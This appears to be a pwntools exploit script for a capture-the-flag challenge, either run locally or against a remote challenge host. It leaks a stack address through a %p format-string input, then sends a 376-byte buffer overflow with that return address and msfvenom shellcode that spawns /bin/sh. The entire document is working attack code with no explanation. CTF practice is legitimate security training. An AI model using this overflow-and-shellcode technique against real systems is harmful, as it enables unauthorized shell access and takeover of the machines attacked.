from pwn import *
from sys import exit

m = 1 # in which way to interact

p = None
c = 10  # leak time

buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
buf += b"\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05"      # simple shellcode to spawn /bin/sh by msfvenom

while(True):
    if(m == 1):
        p = process("./chall")
    else:
        p = remote("34.45.81.67", 16004)

    p.sendlineafter(b">", b"Md7")
    p.sendlineafter(b"honks?", str(c).encode())

    p.recvline()
    d = p.recvline()
    e = p.recv(123)
    print(d)
    print(e)
    if(b"GET THE HONK OUT!" in e):
        c = d.count(b"HONK")
        print(c)
        p.close()
        # exit()
        continue
    else:
        p.sendline(b"%p")
        # gdb.attach(p)
        # input("s")
        s= p.recvuntil(b"ld?")
        s = int(s.split(b"wow ")[1].split(b" ")[0], 16) + 0x52 + 0x8
        print(s)
        p.sendline(b"A"*(376) + p64(s) + buf)
        p.interactive()
        exit()
